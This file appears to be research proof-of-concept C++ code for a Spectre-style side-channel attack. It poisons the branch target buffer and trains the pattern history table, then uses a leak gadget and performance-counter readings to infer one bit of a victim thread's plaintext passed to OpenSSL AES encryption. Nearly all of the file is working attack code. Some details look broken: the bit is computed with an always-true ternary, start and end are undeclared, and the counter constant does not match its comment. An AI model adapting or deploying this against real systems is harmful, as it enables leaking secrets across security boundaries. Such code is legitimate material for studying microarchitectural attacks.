#include <include/internal/evp_int.h>
#include <cstring>
#include <iostream>
#include "../../include/util.h"
#include "../../include/timingtest.h"


int lock = 0; // sync lock: 0->victim; 1->attacker
int victim = 0;
int attacker = 1;
int readyforpoison = 0;

unsigned char taken[] = "vvvv";
unsigned char nottaken[] = "wwww";

uint64_t unused1[64];
int temp5 = 50;
uint64_t unused2[64];

const int pmc1 = 0x00000000; // BR_MISP_EXEC.ALL_CONDITIONAL

void *attacker_thread( void *ptr );
void *victim_thread( void *ptr );

void sync_thread(int ctrl) {
    while (lock != ctrl) {sched_yield();}
}

void lock_free(int ctrl) {
    if (ctrl == victim) lock = attacker;
    else lock = victim;
    sched_yield();
}

int ret_encrypted(void *key, const unsigned char *pt) {
    // Credit: https://github.com/HexHive/SMoTherSpectre
    unsigned char ciphertext[16];
    unsigned char plaintext[16] = "Dummy";
    int outl;

    int ret = EVP_EncryptUpdate((EVP_CIPHER_CTX*)key, ciphertext, &outl, pt, 16);
    // for (size_t i = 0; i < 16; i++) printf("%02x ",pt[i]); 
    // printf("\n");

    return ret;
}

extern "C" int leak_gadget(void *ptr);
__asm__(
  "leak_gadget:\n"
  "  mov  (%rdi), %r12\n"   // r12 = [ptr[0]]
  "  test  $0b1, %r12\n"    // Test LSB of 1st byte is 1
  "  je  target_branch\n"   // Taken if LSB of 1st byte is 0 (ZF = 1)
  "  mov $0, %rax\n"
//   "  mov %r12, %rax\n"
  "  ret\n"
  "target_branch:\n"
  "  mov $1, %rax\n"
  "  ret\n"
);

class OpenSSLEVPObj {
    // Credit: https://github.com/IAIK/transientfail
    public:
        virtual void evp_custom_enc(void *pt) {
        }
 
};

class VicObj : public OpenSSLEVPObj {
    // Credit: https://github.com/IAIK/transientfail
    private:
        EVP_CIPHER_CTX *secret_key;
    public:
        VicObj(void *key) {
            secret_key = (EVP_CIPHER_CTX*)key;
        }

        void evp_custom_enc(void *pt) {
            ret_encrypted(secret_key, (const unsigned char*)pt); // OpenSSL Encryption
        }

};

class AtkObj : public OpenSSLEVPObj {
    // Credit: https://github.com/IAIK/transientfail
    private:
        EVP_CIPHER_CTX *known_key;
    public:
        AtkObj(void *key) {
            known_key = (EVP_CIPHER_CTX*)key;
        }

        void evp_custom_enc(void *pt) {
            // TODO: Transmitter gadget
            leak_gadget(pt);
            maccess(&temp5);
        }
};

void victim_func(OpenSSLEVPObj* evpObj, void *pt) {
    // Credit: https://github.com/IAIK/transientfail
  evpObj->evp_custom_enc(pt); // Pass in the plaintext to execute
}


int main(int argc, char ** argv) {
    maccess(&temp5); mfence();
    std::cout << "Cache hit: " << flush_reload_t(&temp5) << " Cache miss: " << flush_reload_t(&temp5) << std::endl;
    int i = 0;
    int ret_a, ret_v;
    pthread_t atk, vic;

    ret_a = pthread_create(&atk, NULL, attacker_thread, (void*)(intptr_t) i);
    ret_a = pthread_create(&vic, NULL, victim_thread, (void*)(intptr_t) i);

    pthread_join(atk, NULL);
    pthread_join(vic, NULL); 
}


void *attacker_thread( void *ptr ) {
    sync_thread(attacker);
    const unsigned char atk_key[] = "11111111111111111111111111111111";
    printf("2. Attacker intializing...");
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) 
        printf("Failed\n");
    unsigned char temp_1[16];
    // Setup the encryption keys
    EVP_EncryptInit(ctx, EVP_aes_128_xts(), atk_key, temp_1); // Attacker
    printf(" Initialized\n");
    lock_free(attacker);


    sync_thread(attacker);
    AtkObj* atk_evp = new AtkObj(ctx);
    lock_free(attacker);

    while (!readyforpoison) {};
    // poison btb
    printf("3. Poisoing BTB\n");
    for(int i = 0; i < 10000; i++) {
      victim_func(atk_evp, taken);
    }
    mfence();

    // PHT train x8
    AT100;victim_func(atk_evp, taken);
    AT100;victim_func(atk_evp, taken);
    AT100;victim_func(atk_evp, taken);
    AT100;victim_func(atk_evp, taken);
    AT100;victim_func(atk_evp, taken);
    AT100;victim_func(atk_evp, taken);
    AT100;victim_func(atk_evp, taken);
    AT100;victim_func(atk_evp, taken);
    mfence();

    flush(&temp5);
    readyforpoison = false;
    sched_yield();
    // lock_free(attacker);


    printf("5. Attacker inference\n");
    uint64_t timer;

    mfence();
    AT100;victim_func(atk_evp, nottaken);
    AT100;victim_func(atk_evp, nottaken);
    AT100;victim_func(atk_evp, nottaken);

    AT100;
    start = (int)readpmc(pmc1);
    victim_func(atk_evp, nottaken);
    end = (int)readpmc(pmc1);
    timer = end - start;

    int bit = 1 ? timer : 0;
    printf("Secret bit value: %d\n", bit);


    printf("Exiting attacker\n");
    lock_free(attacker);

    return 0;
}

void *victim_thread( void *ptr ) {
    /* Attacker will leak the lsb corresponding to first charater */
    // unsigned char pt_t[17] = "wxxxxxxxxxxxxxxx"; // LSB = 1 (this will make ZF=0)
    unsigned char pt_t[17] = "vxxxxxxxxxxxxxxx";  // LSB = 0 (this will make ZF=1)

    sync_thread(victim);
    const unsigned char vic_key[] = "00000000000000000000000000000000";
    printf("1. Victim intializing...");
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) 
        printf("Failed\n");
    unsigned char temp_1[16];
    // Setup the encryption keys
    EVP_EncryptInit(ctx, EVP_aes_128_xts(), vic_key, temp_1); // Victim
    printf(" Initialized\n");
    lock_free(victim);

    sync_thread(victim);
    VicObj* victim_evp = new VicObj(ctx);
    lock_free(victim);

    readyforpoison = true;
    sched_yield();

    // while (readyforpoison) {sched_yield();} // Yield to preserve one-level;
    printf("4. Executing victim...");
    
    AT100;
    victim_func(victim_evp, pt_t); // Victim execution (call the EVP_EncryptUpdate)
    mfence();
    int t = flush_reload_t(&temp5);
    printf(" Executed. Posioned? %d\n", t);
    lock_free(victim);


    return 0;
}